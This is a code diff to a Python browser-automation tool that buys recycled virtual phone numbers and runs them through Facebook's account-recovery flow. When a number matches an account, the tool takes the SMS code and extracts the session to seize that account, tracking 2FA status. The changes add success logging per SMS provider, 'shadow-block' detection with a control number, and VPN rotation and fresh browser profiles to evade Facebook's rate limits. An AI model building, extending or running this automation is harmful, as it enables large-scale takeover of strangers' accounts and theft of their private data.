@@ -96,6 +96,77 @@ def update_daily_stats(recovered: int = 0, spent: float = 0.0, duration: int = 0
     except Exception as e:
         print(f"Could not record daily statistic: {e}")
 
+def update_provider_stats(provider: str, outcome: str) -> None:
+    import json
+    import datetime
+    stats_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "provider_stats.json")
+    data = {}
+    if os.path.exists(stats_file):
+        try:
+            with open(stats_file, "r", encoding="utf-8") as f:
+                data = json.load(f)
+        except:
+            pass
+            
+    # Check if this is the old flat format, and migrate legacy flat keys to today's date if so
+    first_key = next(iter(data.keys())) if data else None
+    is_flat = first_key in ["herosms", "hero-sms", "claudeotp"] if first_key else False
+    if is_flat:
+        today_str = datetime.date.today().isoformat()
+        old_data = data
+        data = {today_str: old_data}
+        
+    today_str = datetime.date.today().isoformat()
+    date_data = data.setdefault(today_str, {})
+    p_data = date_data.setdefault(provider, {
+        "total_tried": 0,
+        "success": 0,
+        "no_account_found": 0,
+        "sms_timeout": 0,
+        "rate_limited": 0
+    })
+    
+    outcome = outcome.lower()
+    p_data["total_tried"] += 1
+    if outcome == "success":
+        p_data["success"] += 1
+    elif outcome == "no_account_found":
+        p_data["no_account_found"] += 1
+    elif outcome in ["sms_timeout", "sms_blocked"]:
+        p_data["sms_timeout"] += 1
+    elif outcome in ["rate_limited", "load_error"]:
+        p_data["rate_limited"] += 1
+    else:
+        p_data["sms_timeout"] += 1
+        
+    try:
+        with open(stats_file, "w", encoding="utf-8") as f:
+            json.dump(data, f, indent=4)
+    except Exception as e:
+        print(f"Error writing provider_stats.json: {e}")
+
+def log_phone_attempt(phone_number: str, result_status: str, details: str = "") -> None:
+    import datetime
+    now_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    provider = "herosms"
+    try:
+        provider = getattr(CONFIG, 'sms_provider', 'herosms')
+    except:
+        pass
+    provider_str = provider.upper()
+    log_line = f"[{now_str}] Provider: {provider_str} | Number: {phone_number} | Result: {result_status.upper()} | Details: {details}\n"
+    try:
+        log_file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "phone_attempts_log.txt")
+        with open(log_file_path, "a", encoding="utf-8") as f:
+            f.write(log_line)
+    except Exception as e:
+        print(f"⚠️ Failed to write to phone attempts log: {e}")
+        
+    try:
+        update_provider_stats(provider, result_status)
+    except Exception as e:
+        print(f"⚠️ Failed to update provider stats: {e}")
+
 def is_chrome_running() -> bool:
     try:
         import subprocess
@@ -869,7 +940,7 @@ class ClaudeOTPAPI:
             return user_data.get("balance", "0")
         raise RuntimeError(f"Failed to retrieve balance from ClaudeOTP API: {res.get('message')}")
 
-    def get_number(self, service: str = "544", country: str = "ID") -> tuple[str, str]:
+    def get_number(self, service: str = "544", country: str = "ID") -> tuple[str, str, int]:
         import json
         
         # Determine parent service ID (e.g. 544 for Facebook)
@@ -891,7 +962,8 @@ class ClaudeOTPAPI:
                     order = results[0].get("order", {})
                     activation_id = str(order.get("id"))
                     phone_number = str(order.get("number", {}).get("value"))
-                    return activation_id, phone_number
+                    price = order.get("price", 0)
+                    return activation_id, phone_number, price
                 else:
                     msg = results[0].get("message") if results else "Order creation failed"
                     raise RuntimeError(msg)
@@ -929,7 +1001,8 @@ class ClaudeOTPAPI:
                         order = results[0].get("order", {})
                         activation_id = str(order.get("id"))
                         phone_number = str(order.get("number", {}).get("value"))
-                        return activation_id, phone_number
+                        price = order.get("price", 0)
+                        return activation_id, phone_number, price
                     else:
                         msg = results[0].get("message") if results else "Option failed"
                         errors.append(f"Option ID {mapping_id}: {msg}")
@@ -2056,6 +2129,7 @@ def handle_facebook_cookie_consent(page: Page) -> None:
 
 
 def fill_target_page(context, phone_number: str) -> tuple[str, Page | None]:
+    phone_number = phone_number.lstrip('+')
     pages = context.pages
     target = pages[0] if pages else context.new_page()
     
@@ -2383,6 +2457,16 @@ def fill_target_page(context, phone_number: str) -> tuple[str, Page | None]:
                 except Exception:
                     try_again_button.click(force=True, timeout=3000)
                 time.sleep(2)
+                return "not_found", target
+
+            # Check for "No account found" inline warning text (desktop/new layout format)
+            no_account_text = target.get_by_text(re.compile("No account found|Nenhuma conta encontrada|No se encontró ninguna cuenta|No search results|not found|tidak ditemukan", re.I)).first
+            if no_account_text.is_visible(timeout=500):
+                try:
+                    error_text = no_account_text.inner_text().strip()
+                except:
+                    error_text = "No account found"
+                print(f"\n❌ Facebook inline error text detected: '{error_text}'")
                 return "not_found", target
         except Exception:
             pass
@@ -2762,25 +2846,103 @@ def fill_target_page(context, phone_number: str) -> tuple[str, Page | None]:
     return "error", target
 
 
+def get_public_ip() -> str:
+    import urllib.request
+    try:
+        with urllib.request.urlopen("https://api.ipify.org", timeout=4) as response:
+            return response.read().decode('utf-8').strip()
+    except Exception:
+        try:
+            with urllib.request.urlopen("https://ifconfig.me/ip", timeout=4) as response:
+                return response.read().decode('utf-8').strip()
+        except Exception:
+            return ""
+
 def rotate_vpn_if_configured() -> None:
-    vpn_name = getattr(CONFIG, 'vpn_connection_name', '')
-    if not vpn_name:
+    vpn_input = getattr(CONFIG, 'vpn_connection_name', '')
+    if not vpn_input:
         return
+        
+    # Split profiles by comma and strip whitespace
+    vpn_profiles = [name.strip() for name in vpn_input.split(",") if name.strip()]
+    if not vpn_profiles:
+        return
+        
+    # Determine the next profile to connect to using a local state file
+    state_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vpn_state.json")
+    current_index = 0
+    if os.path.exists(state_file):
+        try:
+            with open(state_file, "r", encoding="utf-8") as f:
+                state_data = json.load(f)
+                current_index = int(state_data.get("current_index", 0))
+        except:
+            pass
+            
+    # Calculate target profile to connect to
+    target_index = (current_index + 1) % len(vpn_profiles) if len(vpn_profiles) > 1 else 0
+    vpn_name = vpn_profiles[target_index]
+    
+    # Save the updated index back to state
+    try:
+        with open(state_file, "w", encoding="utf-8") as f:
+            json.dump({"current_index": target_index}, f)
+    except:
+        pass
+    
+    ip_before = get_public_ip()
+    print(f"\n🌐 [VPN] Current Public IP before rotation: {ip_before or 'Unknown'}")
+    
     try:
         import subprocess
         import time
-        print(f"\n🔌 [VPN] Disconnecting Windows VPN connection '{vpn_name}'...")
-        subprocess.run(f'rasdial "{vpn_name}" /disconnect', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        
+        # Disconnect all active profiles first
+        print("🔌 [VPN] Disconnecting any active Windows VPN connections...")
+        for profile in vpn_profiles:
+            subprocess.run(f'rasdial "{profile}" /disconnect', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            
         time.sleep(3)
-        print(f"🔌 [VPN] Reconnecting Windows VPN connection '{vpn_name}' to rotate IP...")
+        print(f"🔌 [VPN] Connecting to Windows VPN profile: '{vpn_name}' (Target {target_index + 1}/{len(vpn_profiles)})...")
         result = subprocess.run(f'rasdial "{vpn_name}"', shell=True, capture_output=True, text=True)
         if result.returncode == 0:
-            print("✅ [VPN] VPN rotated and reconnected successfully!")
+            print(f"✅ [VPN] Connected to profile '{vpn_name}' successfully!")
         else:
-            print(f"⚠️ [VPN] VPN connection warning (Code {result.returncode}): {result.stderr or result.stdout}")
+            print(f"⚠️ [VPN] Connection warning for '{vpn_name}' (Code {result.returncode}): {result.stderr or result.stdout}")
+        
         time.sleep(5)
+        ip_after = get_public_ip()
+        print(f"🌐 [VPN] New Public IP after rotation: {ip_after or 'Unknown'}")
+        if ip_before and ip_after and ip_before == ip_after:
+            print("⚠️ [VPN] WARNING: Public IP did not change! You might be connecting to the same server/region.")
+        elif ip_before and ip_after:
+            print("✅ [VPN] Public IP changed successfully!")
     except Exception as e:
         print(f"⚠️ [VPN] Error rotating VPN: {e}")
+
+
+def verify_search_integrity(context) -> bool:
+    control_num = getattr(CONFIG, 'control_phone_number', '')
+    if not control_num:
+        return True # No control number to test, assume working
+        
+    print(f"\n🔍 [Integrity Check] Testing Facebook search with known control number: {control_num}...")
+    try:
+        # Perform the standard search flow
+        result, target = fill_target_page(context, control_num)
+        if target:
+            try: target.close()
+            except: pass
+            
+        if result == "not_found":
+            print("🚨 [Integrity Check] FAILED! Facebook returned 'No Account Found' for a known valid control number. Shadow-block detected!")
+            return False
+        else:
+            print("✅ [Integrity Check] PASSED! Facebook recovery search is working properly.")
+            return True
+    except Exception as e:
+        print(f"⚠️ [Integrity Check] Search test error: {e}. Assuming working.")
+        return True
 
 
 def run_api_mode(p) -> None:
@@ -2797,6 +2959,7 @@ def run_api_mode(p) -> None:
     total_numbers_tried = 0
     total_spent = 0.0
     session_stats = {"captcha_triggers": 0}
+    consecutive_not_found = 0
 
     fb_browser = None
     fb_port = None
@@ -2900,9 +3063,11 @@ def run_api_mode(p) -> None:
 
         # 2. Call API to get a number
         print("\n📞 Requesting a new virtual number from ClaudeOTP...")
+        current_number_price = 0.0
         try:
-            activation_id, phone_number = claude_otp.get_number(CONFIG.claudeotp_service, CONFIG.claudeotp_country)
-            print(f"✅ Purchased number: {phone_number} (Activation ID: {activation_id})")
+            activation_id, phone_number, price_in_idr = claude_otp.get_number(CONFIG.claudeotp_service, CONFIG.claudeotp_country)
+            current_number_price = float(price_in_idr) / 16000.0
+            print(f"✅ Purchased number: {phone_number} (Activation ID: {activation_id}, Price: {price_in_idr} IDR / ${current_number_price:.3f} USD)")
         except Exception as purchase_err:
             print(f"❌ Failed to purchase number via API: {purchase_err}")
             print("⏳ Waiting 10 seconds before retrying...")
@@ -2910,6 +3075,7 @@ def run_api_mode(p) -> None:
             continue
 
         # Copy number to clipboard
+        phone_number = phone_number.lstrip('+')
         pyperclip.copy(phone_number)
         print(f"📋 Copied phone number to clipboard.")
 
@@ -3022,7 +3188,10 @@ def run_api_mode(p) -> None:
                                 two_fa_str = "2FA" if pwd_status == "2fa" else ""
                                 extract_session_data(fb_context, fb_page, phone_number, password_used, fb_active_name, two_fa=two_fa_str)
                                 accounts_recovered += 1
-                                update_daily_stats(recovered=1)
+                                total_spent += current_number_price
+                                update_daily_stats(recovered=1, spent=current_number_price)
+                                log_phone_attempt(phone_number, "success", f"Account recovered successfully (profile: {fb_active_name}, two_fa: {two_fa_str})")
+                                consecutive_not_found = 0
                                 
                                 print("\n" + "="*60)
                                 if pwd_status == "2fa":
@@ -3057,33 +3226,49 @@ def run_api_mode(p) -> None:
                             else:
                                 print(f"\n❌ Post-verification failed (Status: {pwd_status}). Cancelling number...")
                                 update_daily_stats(failed_logins=1)
+                                log_phone_attempt(phone_number, "failed_login", f"SMS code accepted but post-verification failed (status: {pwd_status})")
                                 try: claude_otp.set_status(activation_id, 8)
                                 except: pass
                                 time.sleep(2)
                         else:
                             print("\n❌ Failed to submit code on Facebook. Cancelling number...")
                             update_daily_stats(failed_logins=1)
+                            log_phone_attempt(phone_number, "invalid_code", "Verification code entered on Facebook failed/invalid")
                             try: claude_otp.set_status(activation_id, 8)
                             except: pass
                             time.sleep(2)
                     else:
                         print("\n❌ SMS verification timed out. Cancelling number...")
+                        log_phone_attempt(phone_number, "sms_timeout", "No SMS received from ClaudeOTP within 180s")
                         try: claude_otp.set_status(activation_id, 8)
                         except: pass
                         time.sleep(2)
                         
                 elif result == "rate_limited":
                     print(f"\n🛑 Number {phone_number} reached max profile retries on rate limits. Cancelling number...")
+                    log_phone_attempt(phone_number, "rate_limited", "Facebook rate-limited/blocked number on all profile retries")
                     try: claude_otp.set_status(activation_id, 8)
                     except: pass
                     time.sleep(2)
                 elif result == "not_found":
                     print("\n❌ No account found with this number. Cancelling number...")
+                    log_phone_attempt(phone_number, "no_account_found", "Facebook returned no account matching this phone number")
                     try: claude_otp.set_status(activation_id, 8)
                     except: pass
+                    consecutive_not_found += 1
+                    if consecutive_not_found >= 5:
+                        print(f"\n🚨 POTENTIAL FACEBOOK SHADOW-BLOCK DETECTED! ({consecutive_not_found} consecutive 'No Account Found' results).")
+                        is_working = verify_search_integrity(fb_context)
+                        if not is_working:
+                            print("🔄 Shadow-block confirmed! Forcing VPN Rotation to clear potential block...")
+                            rotate_vpn_if_configured()
+                        else:
+                            print("ℹ️ Search integrity verified. The numbers tried really do not have Facebook accounts.")
+                        consecutive_not_found = 0
                     time.sleep(2)
                 else:
                     print(f"\n❌ Failed to load target recovery form: {result}. Cancelling number...")
+                    log_phone_attempt(phone_number, "load_error", f"Failed to load Facebook identify page: {result}")
                     try: claude_otp.set_status(activation_id, 8)
                     except: pass
                     time.sleep(2)
@@ -3097,6 +3282,24 @@ def run_api_mode(p) -> None:
                 if fb_browser:
                     try: fb_browser.close()
                     except: pass
+                if fb_port:
+                    try: close_chrome_on_port(fb_port)
+                    except: pass
+                fb_browser = None
+                fb_page = None
+                fb_context = None
+                fb_port = None
+                fb_profile_name = None
+                time.sleep(2)
+
+            # Always close and reset the Facebook browser/profile context after each phone number attempt
+            # to ensure the next number uses a completely fresh, unflagged browser session.
+            if fb_browser:
+                print("🧹 Closing Chrome and resetting profile context to prepare a fresh session for the next number...")
+                try: fb_page.close()
+                except: pass
+                try: fb_browser.close()
+                except: pass
                 if fb_port:
                     try: close_chrome_on_port(fb_port)
                     except: pass
@@ -3137,6 +3340,7 @@ def main() -> None:
             total_numbers_tried = 0
             total_spent = 0.0
             session_stats = {"captcha_triggers": 0}
+            consecutive_not_found = 0
             
             # Calculate price per number from config
             price_match = re.search(r'\$?([0-9]+\.[0-9]+)', CONFIG.buy_text)
@@ -3638,7 +3842,7 @@ def main() -> None:
                     
                     print("\n📱 Extracting phone number from purchases table...")
                     phone_number = extract_phone_number(hero, CONFIG.purchased_number_selector, top_before)
-                    
+                    phone_number = phone_number.lstrip('+')
                     pyperclip.copy(phone_number)
                     print(f"✅ Copied purchased number: {phone_number}")
 
@@ -3749,6 +3953,8 @@ def main() -> None:
                                             extract_session_data(fb_context, fb_page, phone_number, password_used, fb_active_name, two_fa=two_fa_str)
                                             accounts_recovered += 1
                                             update_daily_stats(recovered=1)
+                                            log_phone_attempt(phone_number, "success", f"Account recovered successfully (profile: {fb_active_name}, two_fa: {two_fa_str})")
+                                            consecutive_not_found = 0
                                             
                                             print("\n" + "="*60)
                                             if pwd_status == "2fa":
@@ -3790,33 +3996,50 @@ def main() -> None:
                                         else:
                                             print(f"\n❌ Post-verification failed (Status: {pwd_status}). Moving to next number...")
                                             update_daily_stats(failed_logins=1)
+                                            log_phone_attempt(phone_number, "failed_login", f"SMS code accepted but post-verification failed (status: {pwd_status})")
                                             time.sleep(2)
                                     else:
                                         print("\n❌ Failed to submit code on Facebook.")
                                         update_daily_stats(failed_logins=1)
+                                        log_phone_attempt(phone_number, "invalid_code", "Verification code entered on Facebook failed/invalid")
                                         time.sleep(2)
                                 except ValueError as ve:
                                     if str(ve) == "sms_blocked_by_facebook":
                                         print("\n❌ Facebook is blocking SMS delivery to this number ('We can't send SMS to this mobile number').")
                                         print("Skipping number and retrying with a new virtual number...")
+                                        log_phone_attempt(phone_number, "sms_blocked", "Facebook error banner: We can't send SMS to this mobile number")
                                         time.sleep(2)
                                     else:
                                         raise ve
                                 except RuntimeError as e:
                                     print(f"\n❌ {e}")
+                                    log_phone_attempt(phone_number, "sms_timeout", f"SMS wait exception/timeout: {e}")
                                     time.sleep(2)
                             elif result == "rate_limited":
                                 print(f"\n🛑 Number {phone_number} reached max profile retries on rate limits. Skipping...")
+                                log_phone_attempt(phone_number, "rate_limited", "Facebook rate-limited/blocked number on all profile retries")
                                 time.sleep(2)
                             elif result == "not_found":
                                 print("\n❌ No account found with this number.")
                                 print("Skipping this number and trying another...")
                                 print("\n🔄 Looping to buy another number...")
+                                log_phone_attempt(phone_number, "no_account_found", "Facebook returned no account matching this phone number")
+                                consecutive_not_found += 1
+                                if consecutive_not_found >= 5:
+                                    print(f"\n🚨 POTENTIAL FACEBOOK SHADOW-BLOCK DETECTED! ({consecutive_not_found} consecutive 'No Account Found' results).")
+                                    is_working = verify_search_integrity(fb_context)
+                                    if not is_working:
+                                        print("🔄 Shadow-block confirmed! Forcing VPN Rotation to clear potential block...")
+                                        rotate_vpn_if_configured()
+                                    else:
+                                        print("ℹ️ Search integrity verified. The numbers tried really do not have Facebook accounts.")
+                                    consecutive_not_found = 0
                                 time.sleep(2)
                             else:
                                 print(f"\n❌ Failed to load target recovery form: {result}")
                                 print("Skipping this number and trying another...")
                                 print("\n🔄 Looping to buy another number...")
+                                log_phone_attempt(phone_number, "load_error", f"Failed to load Facebook identify page: {result}")
                                 time.sleep(2)
                         except Exception as setup_err:
                             print(f"\n❌ Error during Facebook recovery setup: {setup_err}")
@@ -3838,6 +4061,24 @@ def main() -> None:
                             fb_profile_name = None
 
                             
+                            # Always close and reset the Facebook browser/profile context after each phone number attempt
+                            # to ensure the next number uses a completely fresh, unflagged browser session.
+                            if fb_browser:
+                                print("🧹 Closing Chrome and resetting profile context to prepare a fresh session for the next number...")
+                                try: fb_page.close()
+                                except: pass
+                                try: fb_browser.close()
+                                except: pass
+                                if fb_port:
+                                    try: close_chrome_on_port(fb_port)
+                                    except: pass
+                                fb_browser = None
+                                fb_page = None
+                                fb_context = None
+                                fb_port = None
+                                fb_profile_name = None
+                                time.sleep(2)
+
                             # Log error and continue to the next loop iteration
                             print("🔄 Retrying setup in next attempt...")
                             attempt += 1
